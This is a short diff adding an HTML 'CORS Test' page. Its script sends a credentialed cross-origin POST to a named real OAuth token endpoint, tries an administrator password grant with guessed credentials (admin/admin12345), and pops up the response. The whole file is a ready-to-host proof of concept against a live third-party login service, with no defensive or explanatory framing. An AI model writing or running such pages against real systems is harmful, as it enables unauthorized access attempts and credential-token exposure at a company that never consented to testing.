@@ -1,0 +1,19 @@
+<!DOCTYPE html>
+<html>
+  <body>
+    <h1>CORS Test</h1>
+    <script>
+      fetch("https://auth.xchat.xfinity.com/oauth-server/oauth/token", {
+        method: "POST",
+        credentials: "include",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded"
+        },
+        body: "client_id=SupervisorApplication&grant_type=password&username=admin&password=admin12345"
+      })
+      .then(res => res.text())
+      .then(data => alert("CORS Response: " + data))
+      .catch(err => alert("Request Failed: " + err));
+    </script>
+  </body>
+</html>
